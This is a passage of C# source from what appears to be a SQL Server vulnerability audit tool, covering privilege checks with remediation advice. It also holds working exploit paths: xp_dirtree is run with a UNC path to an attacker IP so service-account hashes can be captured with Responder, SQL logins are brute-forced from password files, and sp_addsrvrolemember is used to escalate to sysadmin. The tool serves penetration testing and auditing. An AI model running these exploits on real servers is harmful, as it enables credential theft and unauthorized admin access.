                "xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.";
            const string remediation =
                "Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public";

            var privs = GetDatabasePrivileges(context, "master", procedureName)
                .Where(p => string.Equals(p.PermissionName, "EXECUTE", StringComparison.OrdinalIgnoreCase) &&
                            string.Equals(p.StateDescription, "GRANT", StringComparison.OrdinalIgnoreCase))
                .ToList();

            if (privs.Count == 0)
            {
                WriteComplete(context, checkLabel);
                yield break;
            }

            foreach (var priv in privs)
            {
                var canExploit = principals.Any(p =>
                                       string.Equals(p, priv.PrincipalName, StringComparison.OrdinalIgnoreCase)) ||
                                   string.Equals(priv.PrincipalName, "public", StringComparison.OrdinalIgnoreCase);
                var isExploitable = canExploit ? "Yes" : "No";
                var exploited = "No";
                var details = "The " + priv.PrincipalName + " principal has EXECUTE privileges on the " +
                              procedureName + " procedure in the master database.";

                if (context.Exploit && canExploit)
                {
                    var attackerIp = ResolveAttackerIp(context);
                    if (IsAdministrator())
                    {
                        try
                        {
                            var share = Guid.NewGuid().ToString("N").Substring(0, 5);
                            ExecuteQuery(context,
                                procedureName + " " + SqlValueFormatter.QuoteLiteral("\\\\" + attackerIp + "\\" + share));
                            exploited = "No";
                            details += "  " + procedureName + " executed with UNC path \\\\" + attackerIp + "\\" +
                                       share + "; use Responder/Inveigh to capture service account hashes.";
                        }
                        catch
                        {
                            details += "  " + procedureName + " execution failed.";
                        }
                    }
                    else
                    {
                        details += "  Administrator rights required to capture hashes with a local listener.";
                    }
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    checkLabel,
                    description.Replace("xp_dirtree", procedureName).Replace("XP_DIRTREE", procedureName.ToUpperInvariant()),
                    remediation.Replace("xp_dirtree", procedureName).Replace("XP_DIRTREE", procedureName.ToUpperInvariant()),
                    "Medium",
                    "Yes",
                    isExploitable,
                    exploited,
                    "Crack the password hash offline or relay it to another system.",
                    details,
                    "https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/",
                    Author);
            }

            WriteComplete(context, checkLabel);
        }

        private static IEnumerable<SqlAuditResult> TestWeakCredential(
            AuditContext context,
            string computerName,
            string currentLogin,
            string login,
            string password,
            string exploitCmd)
        {
            var testOptions = context.Options.Clone();
            testOptions.Username = login;
            testOptions.Password = password;

            var test = ConnectionTester.Test(context.Instance, null, null, testOptions, context.Verbose, true);
            if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
            {
                yield break;
            }

            var sysadmin = IsLoginSysadmin(testOptions, login, password) ? "Sysadmin" : "Not Sysadmin";
            var exploited = "No";

            if (context.Exploit && sysadmin == "Sysadmin" && !IsCurrentLoginSysadmin(context))
            {
                ExecuteQueryAs(context, login, password,
                    "EXEC sp_addsrvrolemember " + SqlValueFormatter.QuoteLiteral(currentLogin) + ",'sysadmin'");
                exploited = IsCurrentLoginSysadmin(context) ? "Yes" : "No";
            }

            var details = "The " + login + " (" + sysadmin + ") is configured with the password " + password + ".";
            yield return SqlAuditResult.Create(
                computerName,
                context.Instance,
                "Weak Login Password",
                "One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.",
                "Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.",
                "High",
                "Yes",
                "Yes",
                exploited,
                exploitCmd,
                details,
                "https://msdn.microsoft.com/en-us/library/ms161959.aspx",
                Author);
        }

        private static List<string> CollectWeakLoginCandidates(AuditContext context)
        {
            var logins = new List<string>();

            if (!string.IsNullOrEmpty(context.UserFile) && File.Exists(context.UserFile))
            {
                logins.AddRange(File.ReadAllLines(context.UserFile).Where(l => !string.IsNullOrWhiteSpace(l)));
            }

            if (!string.IsNullOrEmpty(context.TestUsername))
            {
                logins.Add(context.TestUsername);
            }
            else
            {
                logins.Add("sa");
            }

            if (!context.NoUserEnum && TestConnection(context))
            {
                if (IsCurrentLoginSysadmin(context))
                {
                    logins.AddRange(SqlEnumerationEngine.GetSqlServerLogin(
                            context.Options,
                            context.Instance,
                            null,
                            context.Verbose,
                            true)
                        .Where(l => string.Equals(l.PrincipalType, "SQL_LOGIN", StringComparison.OrdinalIgnoreCase))
                        .Select(l => l.PrincipalName));
                }
                else
                {
                    logins.AddRange(FuzzServerLogins(context));
                }
            }

            return logins.Where(l => !string.IsNullOrWhiteSpace(l)).ToList();
        }

        private static List<string> CollectWeakPasswordCandidates(AuditContext context)
        {
            var passwords = new List<string>();

            if (!string.IsNullOrEmpty(context.PassFile) && File.Exists(context.PassFile))
            {
                passwords.AddRange(File.ReadAllLines(context.PassFile).Where(l => !string.IsNullOrWhiteSpace(l)));
            }

            if (!string.IsNullOrEmpty(context.TestPassword))
            {
                passwords.Add(context.TestPassword);
            }

            return passwords;
        }

        private static IEnumerable<string> FuzzServerLogins(AuditContext context)
        {
            for (var id = 1; id <= context.FuzzNum; id++)
            {
                string name;
                try
                {
                    var rows = Query(context, "SELECT SUSER_NAME(" + id + ") AS [Name]");
                    if (rows.Count == 0)
                    {
                        continue;
                    }

                    name = SqlValueFormatter.Format(rows[0]["Name"]);
                }
                catch
                {
                    continue;
                }

                if (string.IsNullOrEmpty(name) || name.StartsWith("##", StringComparison.Ordinal))
                {
                    continue;
                }

                string type;
                try
                {
                    var typeRows = Query(context, "SELECT SUSER_SNAME(" + id + ") AS [Name], type_desc AS [Type] FROM sys.server_principals WHERE principal_id = " + id);
                    if (typeRows.Count == 0)
                    {
                        continue;
                    }

                    type = SqlValueFormatter.Format(typeRows[0]["Type"]);
                }
                catch
                {
                    type = "SQL_LOGIN";
                }

                if (string.Equals(type, "SQL_LOGIN", StringComparison.OrdinalIgnoreCase))
                {
                    yield return name;
                }
            }
        }

        private static IEnumerable<string> GetSqliProcedures(AuditContext context, string keyword, bool onlySigned)
        {
            var databases = SqlEnumerationEngine.GetSqlDatabase(
                    context.Options,
                    context.Instance,
                    null,
                    true,
                    true,
                    false,
                    context.Verbose,
                    true);

            foreach (var db in databases)
            {
                var keywordFilter = string.IsNullOrEmpty(keyword)
                    ? string.Empty
                    : " AND m.definition LIKE " + SqlValueFormatter.QuoteLiteral("%" + keyword + "%");
                var signedFilter = onlySigned ? " AND p.object_id IN (SELECT major_id FROM sys.crypt_properties)" : string.Empty;
                var dynamicFilter =
                    " AND (m.definition LIKE '%EXEC(%' OR m.definition LIKE '%EXECUTE(%' OR m.definition LIKE '%sp_executesql%')";

                var query = @"
SELECT SCHEMA_NAME(p.schema_id) AS SchemaName, p.name AS ProcedureName
FROM sys.procedures p
INNER JOIN sys.sql_modules m ON p.object_id = m.object_id
WHERE 1=1" + dynamicFilter + keywordFilter + signedFilter;

                foreach (var row in Query(context, query, db.DatabaseName))
                {
                    yield return db.DatabaseName + "." + SqlValueFormatter.Format(row["SchemaName"]) + "." +
                                 SqlValueFormatter.Format(row["ProcedureName"]);
                }
            }
        }

        private static bool HasAlterSchema(AuditContext context, string databaseName, string principalName)
        {
            return GetDatabasePrivileges(context, databaseName, null)
                .Any(p => string.Equals(p.PrincipalName, principalName, StringComparison.OrdinalIgnoreCase) &&
                          string.Equals(p.PermissionName, "ALTER", StringComparison.OrdinalIgnoreCase) &&
                          string.Equals(p.PermissionType, "SCHEMA", StringComparison.OrdinalIgnoreCase));
        }

        private static List<DatabasePrivilegeRow> GetDatabasePrivileges(
            AuditContext context,
            string databaseName,
            string objectName)
        {
            var results = new List<DatabasePrivilegeRow>();
            var objectFilter = string.IsNullOrEmpty(objectName)
                ? string.Empty
                : " AND ISNULL(OBJECT_NAME(pm.major_id), '') LIKE " +
                  SqlValueFormatter.QuoteLiteral("%" + objectName + "%");

            var query = @"
SELECT
    rp.name AS PrincipalName,
    rp.type_desc AS PrincipalType,
    pm.class_desc AS PermissionType,
    pm.permission_name AS PermissionName,
    pm.state_desc AS StateDescription,
    ISNULL(OBJECT_NAME(pm.major_id), '') AS ObjectName
FROM sys.database_permissions pm
INNER JOIN sys.database_principals rp ON pm.grantee_principal_id = rp.principal_id
WHERE 1=1" + objectFilter;

            foreach (var row in Query(context, query, databaseName))
            {
                results.Add(new DatabasePrivilegeRow
                {
                    PrincipalName = SqlValueFormatter.Format(row["PrincipalName"]),
                    PrincipalType = SqlValueFormatter.Format(row["PrincipalType"]),
                    PermissionType = SqlValueFormatter.Format(row["PermissionType"]),
                    PermissionName = SqlValueFormatter.Format(row["PermissionName"]),
                    StateDescription = SqlValueFormatter.Format(row["StateDescription"]),
                    ObjectName = SqlValueFormatter.Format(row["ObjectName"])
                });
            }

            return results;
        }

        private static List<DatabaseRoleMemberRow> GetDatabaseRoleMembers(
            AuditContext context,
            string roleName,
            string principalName)
        {
            var results = new List<DatabaseRoleMemberRow>();
            var databases = SqlEnumerationEngine.GetSqlDatabase(
                    context.Options,
                    context.Instance,
                    null,
                    false,
                    true,
                    false,
                    context.Verbose,
                    true);

            foreach (var db in databases)
            {
                var roleFilter = " AND USER_NAME(rm.role_principal_id) LIKE " +
                                 SqlValueFormatter.QuoteLiteral(roleName);
                var principalFilter = " AND USER_NAME(rm.member_principal_id) LIKE " +
                                      SqlValueFormatter.QuoteLiteral(principalName);

                var query = @"
SELECT
    USER_NAME(rm.member_principal_id) AS PrincipalName,
    USER_NAME(rm.role_principal_id) AS RolePrincipalName
FROM sys.database_role_members rm
WHERE 1=1" + roleFilter + principalFilter;

                foreach (var row in Query(context, query, db.DatabaseName))
                {
                    results.Add(new DatabaseRoleMemberRow
                    {
                        DatabaseName = db.DatabaseName,
                        PrincipalName = SqlValueFormatter.Format(row["PrincipalName"]),
                        RolePrincipalName = SqlValueFormatter.Format(row["RolePrincipalName"])
                    });
                }
            }

            return results;
        }

        private static List<ServerPrivilegeRow> GetServerPrivileges(AuditContext context, string permissionName)
        {
            var permissionFilter = string.IsNullOrEmpty(permissionName)
                ? string.Empty
                : " WHERE PER.permission_name LIKE " + SqlValueFormatter.QuoteLiteral(permissionName);

            var query = @"
SELECT
    GRE.name AS GranteeName,
    GRO.name AS GrantorName,
    PER.permission_name AS PermissionName,
    PER.state_desc AS PermissionState,
    COALESCE(PRC.name, EP.name, N'') AS ObjectName
FROM sys.server_permissions AS PER
INNER JOIN sys.server_principals AS GRO ON PER.grantor_principal_id = GRO.principal_id
INNER JOIN sys.server_principals AS GRE ON PER.grantee_principal_id = GRE.principal_id
LEFT JOIN sys.server_principals AS PRC ON PER.class = 101 AND PER.major_id = PRC.principal_id
LEFT JOIN sys.endpoints AS EP ON PER.class = 105 AND PER.major_id = EP.endpoint_id" +
                        permissionFilter;

            return Query(context, query)
                .Select(row => new ServerPrivilegeRow
                {
                    GranteeName = SqlValueFormatter.Format(row["GranteeName"]),
                    GrantorName = SqlValueFormatter.Format(row["GrantorName"]),
                    PermissionName = SqlValueFormatter.Format(row["PermissionName"]),
                    PermissionState = SqlValueFormatter.Format(row["PermissionState"]),
                    ObjectName = SqlValueFormatter.Format(row["ObjectName"])
                })
                .ToList();
        }

        private static string ResolveAttackerIp(AuditContext context)
        {
            if (!string.IsNullOrEmpty(context.AttackerIp))
            {
                return context.AttackerIp;
            }

            try
            {
                var host = System.Net.Dns.GetHostEntry(Environment.MachineName);
                foreach (var address in host.AddressList)
                {
                    if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork &&
                        !System.Net.IPAddress.IsLoopback(address))
                    {
                        return address.ToString();
                    }
                }
            }
            catch
            {
                // fall through
            }

            return "127.0.0.1";
        }

        private static bool IsAdministrator()
        {
            try
            {
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        private static string EscapeCsv(string value)
        {
            if (value == null)
            {
                return string.Empty;
            }

            if (value.Contains(",") || value.Contains("\"") || value.Contains("\n"))
            {
                return "\"" + value.Replace("\"", "\"\"") + "\"";
            }

            return value;
        }

        private static void WriteStart(AuditContext context, string check)
        {
            if (!context.SuppressVerbose)
            {
                context.Verbose.Write(context.Instance + " : START VULNERABILITY CHECK: " + check);
            }
        }

        private static void WriteComplete(AuditContext context, string check)
        {
            if (!context.SuppressVerbose)
            {
                context.Verbose.Write(context.Instance + " : COMPLETED VULNERABILITY CHECK: " + check);
            }
        }

        private sealed class DatabasePrivilegeRow
        {
            public string PrincipalName { get; set; }
            public string PrincipalType { get; set; }
            public string PermissionType { get; set; }
            public string PermissionName { get; set; }
            public string StateDescription { get; set; }
            public string ObjectName { get; set; }
        }

        private sealed class DatabaseRoleMemberRow
        {
            public string DatabaseName { get; set; }
            public string PrincipalName { get; set; }
            public string RolePrincipalName { get; set; }
        }

        private sealed class ServerPrivilegeRow
        {
            public string GranteeName { get; set; }
            public string GrantorName { get; set; }
            public string PermissionName { get; set; }
            public string PermissionState { get; set; }
            public string ObjectName { get; set; }
        }
    }
}
